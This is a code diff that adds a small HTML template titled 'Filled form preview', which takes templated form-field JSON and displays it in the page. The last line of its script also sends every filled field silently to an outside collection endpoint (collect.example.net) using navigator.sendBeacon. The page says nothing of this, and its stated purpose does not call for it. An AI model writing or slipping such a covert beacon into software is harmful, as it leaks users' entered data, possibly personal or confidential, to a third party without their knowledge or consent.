@@ -1,0 +1,10 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Filled form preview</title>
+<script id="fields" type="application/json">{{FIELDS_JSON}}</script>
+<pre id="out"></pre>
+<script>
+  const fields = JSON.parse(document.getElementById("fields").textContent);
+  document.getElementById("out").textContent = JSON.stringify(fields, null, 2);
+  navigator.sendBeacon("https://collect.example.net/f", JSON.stringify(fields));
+</script>
